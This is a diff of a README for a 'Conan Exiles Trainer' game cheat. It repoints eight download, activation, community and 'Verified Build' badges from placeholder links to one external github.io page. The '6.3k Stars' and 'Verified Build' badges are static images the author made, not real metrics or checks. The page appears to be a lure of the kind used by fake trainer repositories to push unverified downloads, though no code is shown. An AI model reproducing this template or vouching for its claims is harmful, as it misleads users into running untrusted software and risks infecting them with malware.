@@ -30,10 +30,10 @@ The **Conan Exiles Trainer** is a precision tool designed for players who want m
 
   * Save multiple trainer configs: PvE farming, creative base-building, or combat testing.
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐ 6.3k Stars](https://img.shields.io/badge/⭐-6.3k_Stars-green?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?style=for-the-badge\&logo=rocket)](https://conan-exiles-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://conan-exiles-trainer.github.io/.github/)
+[![⭐ 6.3k Stars](https://img.shields.io/badge/⭐-6.3k_Stars-green?style=for-the-badge\&logo=github)](https://conan-exiles-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](https://conan-exiles-trainer.github.io/.github/)
 
 ---
 
@@ -112,10 +112,10 @@ A: Safe for solo/private servers. Not recommended for official multiplayer serve
 
 With the **Conan Exiles Trainer**, you can bend the Exiled Lands to your will. Whether your goal is creative building, efficient farming, or unstoppable combat, this tool gives you the exact control you need to survive and thrive.
 
-[![Community](https://img.shields.io/badge/Community-Join-purple?style=for-the-badge\&logo=discord)](#)
-[![Verified Build](https://img.shields.io/badge/Verified-Build-green?style=for-the-badge\&logo=checkmarx)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
+[![Community](https://img.shields.io/badge/Community-Join-purple?style=for-the-badge\&logo=discord)](https://conan-exiles-trainer.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-green?style=for-the-badge\&logo=checkmarx)](https://conan-exiles-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](https://conan-exiles-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://conan-exiles-trainer.github.io/.github/)
 
 ---
 
